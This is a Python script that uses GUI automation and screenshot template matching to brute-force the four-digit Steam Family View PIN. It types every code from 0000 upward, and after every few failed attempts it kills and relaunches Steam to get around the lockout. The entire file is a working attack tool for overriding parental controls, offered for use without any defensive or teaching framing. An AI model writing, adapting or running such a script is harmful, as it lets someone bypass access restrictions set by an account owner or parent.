import secrets
import string
import pyautogui
import time
import subprocess
import os
import sys
import psutil
import cv2
import numpy as np


# Load error template images
error1_template = cv2.imread("error1-5.png", 0)  # 1-5 failed attempts
error6_template = cv2.imread("error6.png", 0)  # After 6 failed attempts

def check_error(screenshot):  # Check for errors first

    res_error1 = cv2.matchTemplate(screenshot, error1_template, cv2.TM_CCOEFF_NORMED)
    loc_error1 = np.where(res_error1 >= 0.8)  # Adjust threshold as needed

    res_error6 = cv2.matchTemplate(screenshot, error6_template, cv2.TM_CCOEFF_NORMED)
    loc_error6 = np.where(res_error6 >= 0.8)  # Adjust threshold as needed

    if len(loc_error1[0]) > 0:
        return 0
    elif len(loc_error6[0]) > 0:
        return 1
    else:
        return 2

def open_steam():
    # Path to the Steam executable
    if sys.platform == "win32":
        steam_path = r"C:\Program Files (x86)\Steam\steam.exe"  # Default path for Windows
    elif sys.platform == "darwin":
        steam_path = "/Applications/Steam.app/Contents/MacOS/Steam"  # Default path for macOS
    else:
        steam_path = "/usr/bin/steam"  # Default path for Linux (may vary)

    # Check if the Steam executable exists
    if os.path.exists(steam_path):
        try:
            subprocess.Popen(steam_path)  # Open Steam
            print("Steam is opening...")
        except Exception as e:
            print(f"Failed to open Steam: {e}")
    else:
        print("Steam executable not found at:", steam_path)

def login_attempt(number):
    print(number)
    app_to_close = "steam.exe"
    if number % 6 == 0:
        print("5 attempts made, closing Steam...")
        close_steam(app_to_close)
        time.sleep(2)
        open_steam()
    i = 0
    time.sleep(5.5)
    pyautogui.moveTo(705, 533)  # Move the mouse to the Steam login button
    pyautogui.click()
    time.sleep(6)
    pyautogui.moveTo(1473, 16)  # Move the mouse to the Steam Family View button
    pyautogui.click()
    pyautogui.moveTo(960, 532)  # Move the mouse to the Input Area
    pyautogui.click()
    while i <= 5:
        # random_password = ''.join(secrets.choice(string.digits) for _ in range(length))
        if number < 10000:
            random_password = str(number).zfill(4)
        pyautogui.typewrite(random_password)
        pyautogui.press('enter')
        print(random_password)
        time.sleep(1)
        screenshot = pyautogui.screenshot()
        screenshot = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        screenshot_gray = cv2.cvtColor(screenshot, cv2.COLOR_BGR2GRAY)
        a = check_error(screenshot_gray)
        i += 1
        if a == 2:

            print("Password found : ", random_password)
            close_steam(app_to_close)
            return True
        number += 1
    login_attempt(number)

def close_steam(Steam):
    # Iterate over all running processes
    for proc in psutil.process_iter(['name']):
        try:
            # Check if the process name matches the application name
            if Steam.lower() in proc.info['name'].lower():
                proc.terminate()  # Terminate the process
                print("Steam closing...")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

if __name__ == "__main__":
    login_attempt(0)